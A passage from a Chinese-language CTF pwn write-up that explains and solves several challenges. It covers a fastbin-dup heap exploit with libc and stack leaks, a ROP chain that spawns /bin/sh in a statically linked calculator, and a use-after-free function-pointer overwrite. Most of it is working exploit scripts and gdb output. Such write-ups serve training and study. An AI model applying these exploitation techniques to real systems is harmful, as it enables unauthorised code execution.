class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，先把libc基址和stack地址泄露出来。利用步骤是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'aaa'</span>)</span><br></pre></td></tr></table></figure><p>先新建两个，intro大小为0x20，然后看一下heap<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap all</span><br><span class="line">Top Chunk:  0x1c8e2a0</span><br><span class="line">Last Remainder:  0x0</span><br><span class="line">0x1c8e000</span><br><span class="line">0x1c8e000 SIZE=0x40 DATA[0x1c8e010] |(.......vvv_347.................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e040 SIZE=0x30 DATA[0x1c8e050] |have a good command of re.......| INUSED PREV_INUSE</span><br><span class="line">0x1c8e070 SIZE=0x40 DATA[0x1c8e080] |........hammer..................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e0b0 SIZE=0x30 DATA[0x1c8e0c0] |have a good command of web......| INUSED PREV_INUSE</span><br><span class="line">0x1c8e0e0 SIZE=0x40 DATA[0x1c8e0f0] |................................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e120 SIZE=0x30 DATA[0x1c8e130] |have a good command of web and c| INUSED PREV_INUSE</span><br><span class="line">0x1c8e150 SIZE=0x40 DATA[0x1c8e160] |........veritas501..............| INUSED PREV_INUSE</span><br><span class="line">0x1c8e190 SIZE=0x30 DATA[0x1c8e1a0] |...............................j| INUSED PREV_INUSE</span><br><span class="line">0x1c8e1c0 SIZE=0x40 DATA[0x1c8e1d0] |o.......aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e200 SIZE=0x30 DATA[0x1c8e210] |aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e230 SIZE=0x40 DATA[0x1c8e240] |o.......aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e270 SIZE=0x30 DATA[0x1c8e280] |aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e2a0 SIZE=0x20d60 TOP_CHUNK</span><br></pre></td></tr></table></figure></p><p>然后把aaa删掉，那么现在有两个0x40的fastbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap freed</span><br><span class="line">FASTBINS:</span><br><span class="line">Fastbin1 : </span><br><span class="line">0x1c8e270 SIZE=0x30 DATA[0x1c8e280] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0x1c8e200 SIZE=0x30 DATA[0x1c8e210] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">Fastbin2 : </span><br><span class="line">0x1c8e230 SIZE=0x40 DATA[0x1c8e240] |........aaa.....................| INUSED PREV_INUSE</span><br><span class="line">0x1c8e1c0 SIZE=0x40 DATA[0x1c8e1d0] |........aaa.....................| INUSED PREV_INUSE</span><br></pre></td></tr></table></figure></p><p>现在，可以新建一个bbb，intro大小为0x38，就是跟结构体的大小一致，目的是伪造一个结构体。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">222</span>)+<span class="string">'puts'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">222</span>)+p64(elf.got[<span class="string">'puts'</span>]) <span class="comment"># len = 0x38</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'bbb'</span>,<span class="number">222</span>,payload)</span><br><span class="line">show(<span class="string">'puts'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br></pre></td></tr></table></figure></p><p>可以看到，之前freed的两个0x40大小fastbin被利用了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xc6e1c0 SIZE=0x40 DATA[0xc6e1d0] |........puts....................| INUSED PREV_INUSE</span><br><span class="line">0xc6e200 SIZE=0x30 DATA[0xc6e210] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br><span class="line">0xc6e230 SIZE=0x40 DATA[0xc6e240] |........bbb.....................| INUSED PREV_INUSE</span><br><span class="line">0xc6e270 SIZE=0x30 DATA[0xc6e280] |........aaaaaaaaaaaaaaaaaaaaaaaa| INUSED PREV_INUSE</span><br></pre></td></tr></table></figure></p><p>看看hack_list的内容，第5个指针是指向我们伪造的puts，此时show puts的资料，就能把puts函数的地址泄露出来。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x6020c0</span><br><span class="line">0x6020c0: 0x0000000000c6e010  0x0000000000c6e080</span><br><span class="line">0x6020d0: 0x0000000000c6e0f0  0x0000000000c6e160</span><br><span class="line">0x6020e0: 0x0000000000c6e1d0  0x0000000000c6e240</span><br></pre></td></tr></table></figure></p><p>stack地址泄露参考：<a href="https://github.com/Naetw/CTF-pwn-tips#leak-stack-address" target="_blank" rel="noopener">https://github.com/Naetw/CTF-pwn-tips#leak-stack-address</a> ，通过<code>environ</code>来leak，stack偏移可以本地调试计算。</p><p>由于开了canary，通过fastbin任意地址写的时候选择没有canary保护的函数，例如用了读取字符串的read_Str，通过修改ret来getshell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,age,intro)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line">  p.sendlineafter(<span class="string">'age:'</span>,str(age))</span><br><span class="line">  p.sendlineafter(<span class="string">':'</span>,str(len(intro)))</span><br><span class="line">  p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">  p.send(intro)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(name)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(name)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'name:'</span>,name) </span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'aaa'</span>,<span class="number">111</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'aaa'</span>)</span><br><span class="line">payload = p64(<span class="number">222</span>)+<span class="string">'puts'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">222</span>)+p64(elf.got[<span class="string">'puts'</span>]) <span class="comment"># len = 0x38</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'bbb'</span>,<span class="number">222</span>,payload)</span><br><span class="line">show(<span class="string">'puts'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]puts addr :'</span>,hex(puts_addr)</span><br><span class="line">libc.address = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]system addr :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack</span></span><br><span class="line">add(<span class="string">'ccc'</span>,<span class="number">333</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'ccc'</span>,<span class="number">333</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="string">'ccc'</span>)</span><br><span class="line"><span class="comment">#payload = p64(444)+'environ'.ljust(0x20,'\0')+p64(444)+p64(libc.address+0x3c92f8) # libc_argv</span></span><br><span class="line">payload = p64(<span class="number">444</span>)+<span class="string">'environ'</span>.ljust(<span class="number">0x20</span>,<span class="string">'\0'</span>)+p64(<span class="number">444</span>)+p64(libc.symbols[<span class="string">'environ'</span>]) <span class="comment"># libc_env</span></span><br><span class="line"><span class="keyword">print</span> len(payload)</span><br><span class="line">add(<span class="string">'ddd'</span>,<span class="number">444</span>,payload)</span><br><span class="line">show(<span class="string">'environ'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'intro:'</span>)</span><br><span class="line">environ_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]environ addr :'</span>,hex(environ_addr)</span><br><span class="line">stack_off = <span class="number">0xf8</span></span><br><span class="line">stack_addr = environ_addr<span class="comment">#-0xf8</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]stack addr :'</span>,hex(stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin dup</span></span><br><span class="line">pr = <span class="number">0x401053</span> <span class="comment"># pop rdi , ret</span></span><br><span class="line">add(<span class="string">'A'</span>,<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="string">'A'</span>,<span class="number">1</span>,<span class="string">'A'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">'B'</span>,<span class="number">2</span>,<span class="string">'B'</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">'A'</span>)  <span class="comment"># A</span></span><br><span class="line">add(<span class="string">'C'</span>,<span class="number">3</span>,<span class="string">'C'</span>*<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="string">'C'</span>)  <span class="comment"># C</span></span><br><span class="line">delete(<span class="string">'B'</span>)  <span class="comment"># B-&gt;C</span></span><br><span class="line">delete(<span class="string">'A'</span>)  <span class="comment"># A==C-&gt;B-&gt;C</span></span><br><span class="line"></span><br><span class="line">offset1_argv = <span class="number">0x13b</span></span><br><span class="line">offset_env = <span class="number">0x13b</span>+<span class="number">16</span></span><br><span class="line">payload = p64(stack_addr-offset_env).ljust(<span class="number">0x60</span>,<span class="string">'\0'</span>) <span class="comment">#read_str stack</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,payload)  <span class="comment">#A</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,<span class="string">'F'</span>*<span class="number">0x60</span>) <span class="comment">#B</span></span><br><span class="line">add(<span class="string">'F'</span>,<span class="number">5</span>,<span class="string">'F'</span>*<span class="number">0x60</span>) <span class="comment">#C</span></span><br><span class="line"></span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">0xb</span> + p64(pr) + p64(next(libc.search(<span class="string">'/bin/sh'</span>))) + p64(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="string">'G'</span>,<span class="number">6</span>,payload.ljust(<span class="number">0x60</span>,<span class="string">'\0'</span>)) <span class="comment">#stack</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>这条题跟之前湖湘杯的一题很想，思路也是一样，程序静态编译，直接组ROPchain就好了。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1[<span class="number">64</span>]; <span class="comment">// [esp+8h] [ebp-110h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+108h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+10Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to my calculator (alpha version)"</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( read_int_3() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v3 = add_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v3 = sub_804894E();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v3 = mul_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v3 = div_func();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt; %d\n"</span>, v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v1[v2] = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"result %d save success!!\n"</span>, v1[v2++]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"bye."</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"invaild choice."</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意会覆盖到v2的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">p= process(<span class="string">'./calc'</span>)</span><br><span class="line"></span><br><span class="line">rop=<span class="string">''</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop+= <span class="string">'/bin'</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080b8446</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">rop+= <span class="string">'//sh'</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080551fb</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080dee5d</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08056ad3</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x08049603</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop+= pack(<span class="string">'&lt;I'</span>, <span class="number">0x0807b01f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">rop += pack(<span class="string">'&lt;I'</span>, <span class="number">0x0806d445</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_save</span><span class="params">(x)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'a:'</span>,<span class="string">'0'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">'b:'</span>,str(x))</span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'5'</span>)</span><br><span class="line"><span class="comment">#padding</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">69</span>):</span><br><span class="line">  add_save(i)</span><br><span class="line"><span class="comment">#rop</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(rop)/<span class="number">4</span>):</span><br><span class="line">  add_save(u32(rop[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">4</span>]))</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'6'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="message-saver"><a href="#message-saver" class="headerlink" title="message_saver"></a>message_saver</h3><p>提示是UAF，程序message结构体如下：</p><table><thead><tr><th>content</th><th>size</th></tr></thead><tbody><tr><td>message size</td><td>8byte</td></tr><tr><td>message addr</td><td>8byte</td></tr><tr><td>encoder</td><td>8byte</td></tr></tbody></table><p>思路是：增加一条message，然后删掉（但指针没清空），此时仍然可以编辑，编辑一个0x18大小的message，encoder修改为程序留的后门（如果没有就泄露libc地址），然后show的时候就会执行encoder位置的函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./message_saver'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(len, con, encoder=<span class="number">1</span>)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,str(len))</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,con)</span><br><span class="line">  p.sendlineafter(<span class="string">'===========\n'</span>,str(encoder))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(len, con)</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,str(len))</span><br><span class="line">  p.sendlineafter(<span class="string">':\n'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">  p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">'a'</span>, <span class="number">1</span>)</span><br><span class="line">delete()</span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">0x10</span> + p64(<span class="number">0x400816</span>)</span><br><span class="line">edit(<span class="number">0x18</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ascii-art-maker"><a href="#ascii-art-maker" class="headerlink" title="ascii_art_maker"></a>ascii_art_maker</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  sub_4006D6();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input the string you want to convert:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x90</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( buf )</span><br><span class="line">    sub_400705(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span 